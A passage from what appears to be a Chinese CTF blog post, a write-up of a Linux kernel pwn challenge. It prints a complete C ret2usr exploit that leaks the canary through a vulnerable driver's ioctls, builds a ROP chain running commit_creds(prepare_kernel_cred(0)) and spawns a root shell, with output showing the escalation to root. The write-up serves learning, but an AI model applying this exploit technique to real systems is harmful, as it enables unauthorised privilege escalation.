class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-- ret2usr --&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 注意:&quot;prepare_kernel_cred&quot;和&quot;commit_creds&quot;都是地址,需要用函数指针执行 */</span></span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* 相当于执行&quot;commit_creds(prepare_kernel_cred(0));&quot; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary : %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>]  = canary ; </span><br><span class="line">    rop[<span class="number">9</span>]  = <span class="number">0</span>; </span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="keyword">size_t</span>)get_shell; </span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] DEBUG: &quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    write(fd, rop, <span class="number">0x30</span> * <span class="number">8</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面的过程都相同，但 ROP 链的构造有所不同</p>
<ul>
<li>直接ROP：<ul>
<li>把 prepare_kernel_cred 和 commit_creds 拆散，放到 ROP 链中执行</li>
</ul>
</li>
<li>ret2usr：<ul>
<li>直接返回到用户空间构造的 <code>commit_creds(prepare_kernel_cred(0))</code>（通过函数指针实现）来提权</li>
<li>虽然这两个函数位于内核空间，但此时我们是 <code>ring 0</code> 特权，因此可以正常运行</li>
<li>之后也是通过 <code>swapgs; iretq</code> 返回到用户态来执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code></li>
</ul>
</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.021763</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ whoami</span><br><span class="line">chal</span><br><span class="line">/ $ /tmp/exp2</span><br><span class="line">commit_creds addr: <span class="number">0xffffffffaea9c8e0</span></span><br><span class="line">vmlinux_base addr: <span class="number">0xffffffffaea00000</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffffaea9cce0</span></span><br><span class="line">[*]status has been saved.</span><br><span class="line">[*]<span class="built_in">set</span> off to <span class="number">64</span></span><br><span class="line">[*]read to buf.</span><br><span class="line">[*]canary : <span class="number">0xedec5afb6b0a1800</span></span><br><span class="line">[*] DEBUG: </span><br><span class="line"></span><br><span class="line">[*]copy from user with size: <span class="number">-65280</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这是我的第一个 kernel pwn，刚刚进入 kernel 感觉有点迷茫，不知道该获取什么信息，修改什么数据，完成此题后我的思路清晰了一点：</p>
<ul>
<li>驱动函数是 kernel 中容易出问题的点，可以用C语言中的 ioctl 来执行驱动函数</li>
<li>/proc/kallsyms 是内核符号表，拥有内核符号的地址，需要收集此信息</li>
<li>kaslr，类似ASLR，内核基址地址加载随机化</li>
<li>使用 <code>commit_creds(prepare_kernel_cred(0))</code> 进行提权（可以放入ROP链中，也可以通过函数指针执行这个整体）</li>
</ul>
<p>踩到的坑：</p>
<ul>
<li>start.sh 中给的内存太小，导致 kernel 跑不起来</li>
<li>题目自带的 vmlinux 和 core.cpio 中的 vmlinux 不一样，导致 gadget 出问题</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/23/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/23/">23</a><span class="page-number current">24</span><a class="page-number" href="/page/25/">25</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/25/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
